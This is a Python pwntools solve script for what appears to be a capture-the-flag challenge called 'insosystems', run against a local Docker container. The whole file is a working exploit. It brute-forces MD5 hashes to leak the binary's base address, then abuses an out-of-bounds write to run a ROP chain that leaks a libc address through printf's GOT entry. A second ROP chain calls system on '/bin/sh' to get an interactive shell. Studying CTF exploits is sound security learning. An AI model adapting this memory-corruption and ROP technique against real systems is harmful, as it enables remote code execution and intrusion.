#!/usr/bin/env python3

# docker build -t insosystems:latest .
# docker run --rm -p 5556:5556 insosystems:latest
# ./solve.py # not 100% reliable

from pwn import *
import hashlib
import time

#context.log_level = logging.DEBUG
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

BIN = './insosystems'
HOST = 'localhost' 
PORT = 5556

p = remote(HOST, PORT)
#p = process(BIN)

def send(b = b''):
    p.send(str.encode(b) + b'|')

def menu(b = b''):
    p.send(b'|' + str.encode(b) + b'|')

# gdb.attach(p, """
# b system
# b memcpy
# """)

# login
menu('0')
send('3')

# leak binary address
hashes = list()
for i in range(8):
    menu('2')
    name_size = 0x26 - i
    send(str(name_size))
    send('A'*3)

    tmp_size = 1
    send(f'{tmp_size}')
    p.sendline('B'*tmp_size)
    hashes.append(str(p.recvline()).split('|')[3])

bytes_leaked = list()
s = b'AAA'.ljust(24, b'\x00') + p64(0x21).ljust(8, b'\x00')
for h in hashes[::-1]:
    for i in range(0x100):
        brute = hashlib.md5(s + p8(i)).hexdigest()
        if brute == h:
            bytes_leaked.append(i)
            s += p8(i)
            break

leaked_address = 0
for i, b in enumerate(bytes_leaked):
    leaked_address += b << (i*8)

bin_base = leaked_address - 0x142b
info(f'binary base address: {hex(bin_base)}')

# leak libc and ret2main
menu('2')
send('3')
send('A'*3)

oob_size = 0x1004
send(f'{oob_size}')
payload = b'A'*(oob_size-4) + p32(-0x38-100, sign='signed')
p.send(payload)

log_func = bin_base + 0xe27
main = bin_base + 0x1a33
printf_got = bin_base + 0x202f18
ret = bin_base + 0xb3e # movabs issue
pop_rdi = bin_base + 0x1b63

chain =  p64(ret) + p64(pop_rdi) + p64(printf_got) + p64(log_func) + p64(main)
chain = chain.ljust(0x1000+0x38 + 4, b'A')
p.send(chain)

raw_leak = p.recvline()
leak = raw_leak[5:len(raw_leak)-2]
printf_address = u64(leak.ljust(8, b'\x00'))
libc_base = printf_address - 0x64e40
info(f'libc base: {hex(libc_base)}')

# ah sh*t, here we go again
# rop to system
menu('2')
send('3')
send('A'*3)

oob_size = 0x1000
send(f'{oob_size+4}')
payload = b'A'*(oob_size) + p32(-0x38-0x3e8, sign='signed') + b'A'.ljust(0x3e8-0x38 - 44)
p.send(payload)

system = libc_base + 0x4f420
sh = libc_base + 0x1b3d88
one_gadget = libc_base + 0x4f302

chain = p64(pop_rdi) + p64(sh) + p64(system)
chain = chain.ljust(0x1000+0x40, b'A')

p.send(chain)

p.interactive()

